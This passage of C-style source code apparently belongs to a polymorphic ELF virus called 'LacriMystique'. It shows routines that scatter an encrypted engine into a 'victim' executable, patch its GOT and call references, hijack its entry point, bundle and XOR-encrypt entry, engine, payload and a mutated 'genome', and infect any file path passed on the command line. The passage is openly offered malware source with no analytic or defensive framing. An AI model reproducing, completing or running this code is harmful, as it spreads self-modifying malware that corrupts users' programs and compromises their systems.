        out_size = scatter_data_off + scatter_data_total;

        // Fix engine code scattered in .text
        text_file_off = read_i32(ei->sec_offset, SI_TEXT * 4);
        gotplt_va = read_i32(ei->sec_addr, SI_GOTPLT * 4);

        fix_scatter_pic_thunks(out, text_file_off, text_chain, code_size, data_addr);

        if (n_plt_slots > 0 && plt_slots != 0) {
            int pi; pi = 0;
            while (pi < n_plt_slots) {
                if (plt_slots[pi] == -1 && wrapper_nodes != 0 && wrapper_nodes[pi] != 0) {
                    struct CodeNode* wn; wn = wrapper_nodes[pi]; plt_slots[pi] = wn->newrva; }
                pi = pi + 1;
            }
            fix_scatter_extern_refs(out, text_file_off, text_chain, plt_slots, n_plt_slots);
        }

        // Fix internal CALL rel32 displacements after scatter
        fix_scatter_call_fixups(out, text_file_off, text_chain);
        fix_scatter_faddr_fixups(out, text_file_off, text_chain);

        // Patch polymorphic entry preloader — fixup offsets tracked via globals
        scatter_entry_va = find_scatter_entry_va(text_chain, entry_off);
        if (bridge_preloader != 0 && scatter_entry_va != 0) {
            int es_va; int es_off;
            int main_got_disp;
            int orig_start_fileoff;
            es_va = bridge_preloader->newrva;
            es_off = text_file_off + bridge_preloader->newofs;
            // Patch gotplt1: ADD EBX imm32 (the only PIC-base compute now;
            // EBX is cached on the stack across CALL entry instead of being
            // recomputed by a second CALL $+0).
            write_i32(out, es_off + g_bridge_gotplt1_off, gotplt_va - (es_va + g_bridge_picbase1_off));
            // Patch CALL entry disp32
            write_i32(out, es_off + g_bridge_entry_call_off, scatter_entry_va - (es_va + g_bridge_entry_call_off + 4));
            // Extract main's GOT displacement from victim's _start.
            // Use input ei->e_entry + ei->data: scatter splits _start across blocks in `out`,
            // and `out`'s e_entry has already been rewritten to _start's new VA.
            orig_start_fileoff = text_file_off + ei->e_entry - ei->text_addr;
            main_got_disp = read_i32(ei->data, orig_start_fileoff + 0x1E);
            // Patch MOV EAX,[EBX+disp]
            write_i32(out, es_off + g_bridge_main_disp_off, main_got_disp);
            print("  e_entry hijack: preloader=");
            print_int(es_va); print(" entry=");
            print_int(scatter_entry_va);
            print(" main=[gotplt");
            print_int(main_got_disp);
            print("]\n");
            write_i32(out, E_ENTRY_OFF, es_va);
        }

        // Patch PIC shim: set ADD EBX,imm to point at .got.plt
        if (pic_shim != 0 && pic_shim->newofs >= 0) {
            write_i32(out, text_file_off + pic_shim->newofs + 8,
                      gotplt_va - (pic_shim->newrva + 5));
        }
        print("  Data segment: VA=");
        print_int(scatter_data_va); print(" size=");
        print_int(scatter_data_total); print("\n");
    }

    // Write output
    write_file_linux(victim_path, out, out_size);
    print("Infected: ");
    print(victim_path);
    print("\n");

    // Cleanup
    free(out);
    free(mark);
    free(reloc_map);
    if (plt_slots != 0) { free(plt_slots); }
    if (wrapper_nodes != 0) { free(wrapper_nodes); }
    free_chain(text_chain);
    free(victim_data);
    free(ei);

    return 0;
}

// =============================================================================
//
// Main Module
//
// Bundle-driven engine entry: infect_one() takes an InfectBundle*, runs the
// full integration pipeline, then writes the new bundle into the infected
// binary. main() is the CLI dispatcher.
//
// =============================================================================

int infect_one(struct InfectBundle* b) {
    char* new_entry_mcb;
    int new_entry_sz;
    char* new_eng_mcb;
    int new_eng_sz;
    char* pay_data;
    int pay_sz;
    char* gen_data;
    int gen_sz;
    int orig_entry_sz;
    int orig_eng_sz;
    char* bundle_buf;
    int bundle_total;
    int bundle_key;
    int result;

    // Read original components from the entry's bundle. Fallback for
    // entry/engine when the recompile didn't emit transformed .mcb;
    // direct source for the pass-through payload + mutated genome.
    bundle_get(b->entry_header, BC_ENTRY,  &orig_entry_sz);
    bundle_get(b->entry_header, BC_ENGINE, &orig_eng_sz);
    pay_data = bundle_get(b->entry_header, BC_PAYLOAD, &pay_sz);
    gen_data = bundle_get(b->entry_header, BC_GENOME,  &gen_sz);

    print("Bundles: entry=");
    print_int(orig_entry_sz);
    print(" engine=");
    print_int(orig_eng_sz);
    print(" payload=");
    print_int(pay_sz);
    print(" genome=");
    print_int(gen_sz);
    print("\n");

    // Use transformed mcb produced by entry.mc; fall back to entry's bundle bytes.
    new_entry_mcb = b->new_entry_mcb_data;
    new_entry_sz = b->new_entry_mcb_size;
    if (new_entry_mcb == 0 || new_entry_sz == 0) {
        new_entry_mcb = bundle_get(b->entry_header, BC_ENTRY, &new_entry_sz);
    }
    new_eng_mcb = b->new_engine_mcb_data;
    new_eng_sz = b->new_engine_mcb_size;
    if (new_eng_mcb == 0 || new_eng_sz == 0) {
        new_eng_mcb = bundle_get(b->entry_header, BC_ENGINE, &new_eng_sz);
    }
    if (b->new_payload_mcb_data != 0 && b->new_payload_mcb_size > 0) {
        pay_data = b->new_payload_mcb_data;
        pay_sz = b->new_payload_mcb_size;
    }

    // Build new 4-bundle: [new_entry.mcb | new_eng.mcb | payload | genome]
    bundle_total = new_entry_sz + new_eng_sz + pay_sz + gen_sz;
    bundle_buf = malloc(bundle_total);
    mem_copy(bundle_buf, new_entry_mcb, new_entry_sz);
    mem_copy(bundle_buf + new_entry_sz, new_eng_mcb, new_eng_sz);
    if (pay_sz > 0) {
        mem_copy(bundle_buf + new_entry_sz + new_eng_sz, pay_data, pay_sz);
    }
    mem_copy(bundle_buf + new_entry_sz + new_eng_sz + pay_sz, gen_data, gen_sz);

    // Encrypt for embedding
    bundle_key = b->prng_seed;
    if (bundle_key == 0) { bundle_key = 305419896; }
    bundle_xor(bundle_buf, bundle_total, bundle_key);

    // Engine's local g_bundle_header_off comes from its own static compilation.
    // Override with entry's offset so infect_elf patches the entry-program
    // data section (scattered into victim) at the right slot.
    g_bundle_header_off   = b->entry_bundle_header_off;

    print("Sizes: entry.scatter=");
    print_int(b->entry_pic_size);
    print(" bundle=");
    print_int(bundle_total);
    print(" (entry_mcb=");
    print_int(new_entry_sz);
    print(" eng_mcb=");
    print_int(new_eng_sz);
    print(" pay=");
    print_int(pay_sz);
    print(")\n");

    result = infect_elf(b->victim_path,
                        b->entry_pic_data, b->entry_pic_size,
                        bundle_buf, bundle_total,
                        new_entry_sz, new_eng_sz,
                        pay_sz, gen_sz,
                        bundle_key);

    free(bundle_buf);
    return result;
}

int main() {
    struct InfectBundle* b;
    char* infect_path;
    int rc;

    init_io();
    lde_init();

    print("LacriMystique active\n");
    print("Engine ready\n");

    b = g_infect_bundle;
    if (b == 0) { return 0; }

    infect_path = parse_cmdline_infect();
    if (infect_path != 0) {
        print("LacriMystique: infecting ");
        print(infect_path);
        print("\n");

        b->victim_path = infect_path;
        rc = infect_one(b);
        // Exit directly via syscall — returning from main() would JMP to _start
        // (entry preloader), re-running the victim's libc init which conflicts with
        // our mmap allocations.
        exit(rc);
        return rc;
    }

    return 0;
}
